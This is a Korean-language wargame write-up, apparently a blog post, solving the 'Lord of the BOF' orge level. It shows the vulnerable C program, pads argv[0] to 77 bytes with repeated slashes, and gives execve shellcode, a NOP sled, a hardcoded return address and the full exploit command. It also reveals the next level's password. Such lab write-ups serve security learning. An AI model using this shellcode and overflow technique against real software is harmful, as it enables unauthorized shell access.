@@ -1,0 +1,150 @@
+---
+layout: post
+title:  "[LOB]Level07. orge"
+subtitle:   "[LOB]darkelf → orge"
+categories: writeup
+tags: lob orge level07
+
+---
+
+# darkelf → orge
+
+## keyword : check argv[0]
+
+
+
+```c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - orge
+        - check argv[0]
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;
+
+main(int argc, char *argv[])
+{
+	char buffer[40];
+	int i;
+
+	if(argc < 2){
+		printf("argv error\n");
+		exit(0);
+	}
+
+	// here is changed!
+	if(strlen(argv[0]) != 77){
+                printf("argv[0] error\n");
+                exit(0);
+	}
+
+	// egghunter
+	for(i=0; environ[i]; i++)
+		memset(environ[i], 0, strlen(environ[i]));
+
+	if(argv[1][47] != '\xbf')
+	{
+		printf("stack is still your friend.\n");
+		exit(0);
+	}
+
+	// check the length of argument
+	if(strlen(argv[1]) > 48){
+		printf("argument is too long!\n");
+		exit(0);
+	}
+
+	strcpy(buffer, argv[1]);
+	printf("%s\n", buffer);
+
+    // buffer hunter
+    memset(buffer, 0, 40);
+}
+```
+
+
+
+------
+
+
+
+### 0x01. Analysis
+
+
+
+```c
+// here is changed!
+if(strlen(argv[0]) != 77){
+    printf("argv[0] error\n");
+    exit(0);
+}
+```
+
+argv[0]의 길이가 77이여야 한는 코드가 추가되었다.
+
+argv[0]는 파일실행경로값이 들어가게 된다.
+
+<img src="/assets/img/writeup/lob/07.orge/image-20180829172758642.png" width="600px">
+
+shell에는 다음과 같은 기능(?)이 있다.
+
+<img src="/assets/img/writeup/lob/07.orge/image-20180829172938587.png" width="600px">
+
+경로명에 '/'를 여러개 넣어도 1개로 인식하여 파일이 실행된다. 하지만 argv[0]의 길이에는 포함이 된다.
+
+이를 이용하여 길이를 77바이트로 만들면 될것 같다.
+
+나머지 문제 풀이법은 darkelf와 같다.
+
+
+
+------
+
+### 0x02. Exploit
+
+
+
+core 덤프를 떨궈 쉘코가 들어갈 주소를 구하자.
+
+<img src="/assets/img/writeup/lob/07.orge/image-20180829173302690.png" width="700px">
+
+
+
+<img src="/assets/img/writeup/lob/07.orge/image-20180829173436809.png" width="500px">
+
+
+
+```
+shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
+
+
+
+이제 쉘코드를 넣고 RET주소에 0xbffffb64 를 넣으면 끄읏~
+
+
+
+<img src="/assets/img/writeup/lob/07.orge/image-20180829173636979.png" width="700px">
+
+```
+/home/darkelf////////////////////////////////////////////////////////////orge `python -c 'print "A"*44+"\x64\xfb\xff\xbf"'` `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+```
+
+
+
+------
+
+
+
+### 0x03. 정리
+
+
+
+argv[0]의 길이를 체크하는 메커니즘이 들어 갔으며, 쉘기능을 사용하여 argv[0] 길이 체크 메커니즘을 우회하였다.
+
+
+
+**orge / timewalker**
